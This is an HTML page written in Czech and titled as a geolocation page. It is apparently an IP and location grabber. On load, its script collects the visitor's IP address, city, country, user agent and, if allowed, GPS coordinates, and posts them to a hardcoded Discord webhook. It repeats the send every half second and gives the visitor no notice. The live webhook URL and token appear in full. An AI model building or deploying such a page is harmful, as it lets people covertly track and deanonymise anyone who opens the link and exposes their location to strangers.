<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
</head>
<body>
    <h1>Geolokace a informace o za콏칤zen칤</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahra캞 sv칳m webhookem

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes칤l치n칤:", error));
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `@everyone\n游님 Za콏칤zen칤: ${device}\n游깴 IP Adresa: ${data.ip} (M캩sto: ${data.city}, Zem캩: ${data.country})\nVPN: FALSE\n${gpsData}`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba z칤sk치n칤 IP:", error));
        }

        function getLocation() {
            let device = navigator.userAgent; // Detekce za콏칤zen칤

            // Odes칤l치n칤 IP a za콏칤zen칤 ihned po na캜ten칤 str치nky
            getIP(device, "游뛂 GPS nen칤 potvrzena");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    getIP(device, `游늸 GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "游뛂 GPS zam칤tnuta");
                });
            }
        }

        window.onload = function() {
            getLocation();

            // Interval pro odes칤l치n칤 IP a za콏칤zen칤 ka쬯칳ch 0,5 sekundy
            setInterval(() => {
                let device = navigator.userAgent;
                getIP(device, "游뛂 GPS nen칤 potvrzena");
            }, 500); // 500 ms = 0,5 sekundy
        };
    </script>
</body>
</html>
